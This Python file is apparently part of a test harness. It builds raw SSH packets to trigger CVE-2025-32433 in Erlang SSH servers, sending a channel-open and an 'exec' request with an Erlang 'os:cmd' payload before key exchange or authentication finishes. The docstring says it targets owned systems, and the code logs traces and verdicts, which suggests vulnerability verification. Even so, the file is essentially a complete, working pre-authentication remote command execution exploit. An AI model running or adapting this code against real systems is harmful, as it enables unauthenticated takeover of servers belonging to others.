"""Independent plaintext SSH framing for owned CVE-2025-32433 target controls.

RFC4253 sections4.2,6,7.1; RFC4254 sections5.1,5.2,6.5. No Framework builders.
Only the pre-NEWKEYS vulnerability path is exercised; ordinary authenticated
SSH is verified independently with the vendor SSH client.
"""
import base64
import json
import os
import socket
import struct
import time


def string(value):
    return struct.pack('!I', len(value)) + value


def packet(payload):
    padding = 8 - ((len(payload) + 5) % 8)
    if padding < 4:
        padding += 8
    return struct.pack('!IB', len(payload) + padding + 1, padding) + payload + os.urandom(padding)


def probe(host, port, command, response_timeout=4):
    trace = []
    messages = []
    started = time.monotonic()
    client = socket.create_connection((host, port), 5)
    client.settimeout(4)
    pending = bytearray()

    def send(data):
        client.sendall(data)
        trace.append({'direction': 'send', 'bytes_base64': base64.b64encode(data).decode()})

    def fill():
        data = client.recv(65536)
        trace.append({'direction': 'recv', 'bytes_base64': base64.b64encode(data).decode()})
        if not data:
            raise EOFError('Server closed the plaintext SSH connection')
        pending.extend(data)

    def receive():
        while len(pending) < 4:
            fill()
        length = struct.unpack('!I', pending[:4])[0]
        if not 5 <= length <= 262144:
            raise ValueError('Invalid bounded SSH packet length')
        while len(pending) < length + 4:
            fill()
        padding = pending[4]
        if not 4 <= padding < length:
            raise ValueError('Invalid SSH packet padding length')
        payload = bytes(pending[5:4 + length - padding])
        del pending[:4 + length]
        messages.append({'type': payload[0], 'payload_base64': base64.b64encode(payload).decode()})
        return payload

    result = {'trace': trace, 'messages': messages, 'execution_sent': False}
    try:
        send(b'SSH-2.0-ModuleTargetNativeControl\r\n')
        while b'\n' not in pending:
            fill()
            if len(pending) > 8192:
                raise ValueError('SSH identification exceeded native capture limit')
        banner, tail = bytes(pending).split(b'\n', 1)
        pending[:] = tail
        result['banner'] = banner.decode().strip()
        assert result['banner'].startswith('SSH-2.0-Erlang'), result['banner']
        offers = [b'curve25519-sha256,ecdh-sha2-nistp256,diffie-hellman-group14-sha256', b'rsa-sha2-512,rsa-sha2-256', b'aes128-ctr', b'aes128-ctr', b'hmac-sha2-256,hmac-sha1', b'hmac-sha2-256,hmac-sha1', b'none', b'none', b'', b'']
        send(packet(b'\x14' + os.urandom(16) + b''.join(string(value) for value in offers) + b'\0' + struct.pack('!I', 0)))
        assert receive()[0] == 20, 'Native server KEXINIT was not received'
        # This flaw processes requests before key exchange/authentication has
        # finished. Replies can be deferred, so waiting for an open confirmation
        # prevents the vulnerable exec path from ever being exercised.
        opening = packet(b'\x5a' + string(b'session') + struct.pack('!III', 0, 0x68000, 0x10000))
        # Keep Unicode codepoints explicit on this independent ASCII wire.
        # Erlang uses \\x{HEX}; JSON's \\u syntax is not an Erlang escape.
        literal = ''.join('\\x{' + format(ord(character), 'x') + '}' if ord(character) > 127 else character for character in json.dumps(command, ensure_ascii=False))
        expression = ('os:cmd(' + literal + ').').encode('ascii')
        execution = packet(b'\x62' + struct.pack('!I', 0) + string(b'exec') + b'\x01' + string(expression))
        send(opening + execution)
        result['execution_sent'] = True
        # Affected services can defer channel replies until NEWKEYS. The caller
        # uses independent filesystem proof, so that path needs no long wait.
        client.settimeout(response_timeout)
        result['post_dispatch_read_timeout_seconds'] = response_timeout
        try:
            while time.monotonic() - started < 10:
                value = receive()
                if value[0] in [1, 97]:
                    break
        except (socket.timeout, EOFError) as error:
            result['read_end'] = type(error).__name__
        result['verdict'] = 'preauth_channel_rejected' if any(item['type'] == 1 for item in messages) else 'preauth_command_sent; native filesystem proof required'
        return result
    except Exception as error:
        result['error'] = {'class': type(error).__name__, 'message': str(error)}
        result['verdict'] = 'Native SSH protocol control failed; no qualification'
        return result
    finally:
        client.close()
        result['elapsed_seconds'] = time.monotonic() - started
